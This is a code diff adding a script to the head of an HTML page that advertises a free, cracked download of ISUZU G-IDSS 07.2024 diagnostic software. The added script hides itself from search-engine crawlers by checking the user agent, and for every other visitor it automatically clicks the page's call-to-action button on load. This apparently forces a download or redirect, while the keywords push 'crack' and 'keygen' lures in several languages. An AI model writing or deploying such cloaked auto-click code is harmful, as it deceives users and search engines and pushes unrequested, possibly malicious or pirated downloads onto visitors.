@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ISUZU G-IDSS Domestic Japanese 07.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="ISUZU G-IDSS Domestic Japanese 07.2024 diagnostic system for Isuzu vehicles in Japan, supports vehicle system diagnostics, maintenance, firmware updates.">
     <meta name="keywords" content="ISUZU G-IDSS, Domestic Japanese, diagnostic service system, Isuzu vehicles, vehicle diagnostics, maintenance system, firmware updates, Japanese automotive diagnostics, ISUZU software, G-IDSS 07.2024, Isuzu diagnostic tool, vehicle maintenance Japan, Isuzu firmware, automotive repair diagnostics, Japanese vehicle systems, free download, free installer, free download installer, ISUZU G-IDSS download, ISUZU G-IDSS free download, ISUZU G-IDSS Domestic Japanese download, ISUZU G-IDSS 07.2024 download, ISUZU G-IDSS Domestic Japanese 07.2024 free download, G-IDSS 2024 download, G-IDSS 2024 free download, ISUZU diagnostic software, ISUZU diagnostic software download, ISUZU diagnostic software free download, ISUZU diagnostic software crack, ISUZU diagnostic software keygen, ИСУЗУ G-IDSS, ИСУЗУ G-IDSS скачать, ИСУЗУ G-IDSS бесплатная загрузка, ИСУЗУ G-IDSS Япония, ИСУЗУ диагностическая система, ISUZU диагностичний програмного забезпечення, ISUZU диагностичний програмного забезпечення скачати безкоштовно, ISUZU діагностичний інструмент, ISUZU завантажити безкоштовно">
     <style>
